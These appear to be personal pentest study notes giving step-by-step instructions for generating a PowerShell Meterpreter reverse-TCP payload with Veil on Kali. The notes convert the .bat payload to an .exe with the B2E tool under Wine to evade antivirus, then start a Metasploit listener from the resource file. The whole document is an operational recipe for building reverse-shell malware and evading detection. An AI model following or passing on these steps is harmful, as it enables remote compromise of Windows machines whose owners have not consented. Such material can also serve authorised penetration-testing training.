GENERATING POWERSHELL PAYLOADS USING VEIL
veil is not installed on kali by default
To install veil
apt-get install veil
choose Yes for all options

veil has 2 tools
evasion and ordnance
use evasion
list payload
c/meterpreter/rev_tcp.py is almost the same regular payload we use on
msfconsole which is windows/meterpreter/reverse_tcp

creating powershell payload
select powershell/meterpreter/rev_tcp.py
set LHOST
set SLEEP == for amount of seconds payload should sleep after execution before
establishing connection with listener
type generate to create payload
enter a name for payload

now we have payload.bat generated


veil payload source code is always written in .bat file
most important files: source code and metasploit resource file


1)SOURCE CODE == must be converted to .exe file... even though windows can
run a .bat file, it can be easily detected by AVs since its just a basic code


HOW TO CONVERT .BAT payload TO .EXE
download b2e tool from github
git clone https://github.com/tokyoneon/B2E
cd B2E
unzip the zip file == unzip [zip filename]
run the .exe file in the folder using wine program
now using WINE program already installed;
type == wine [filename.exe]
wine == is a program used to run windows files on linux
wait a bit then follow prompts
after installation is done, launch b2e converter

to convert payload to .exe
open in converter
click file
click open
go to payload path from .b2e converter
select payload
change exe_format to 64-bit windows(cos we are attacking windows)
save as .exe

now, open msfconsole
copy the payload metasploit resource file from veil, copy entire path
type inside msfconsole: resource [entire resource file]

this command will automatically starts a listener for our payload in the BG

NB: all payloads converted with B2E file always get detected by AV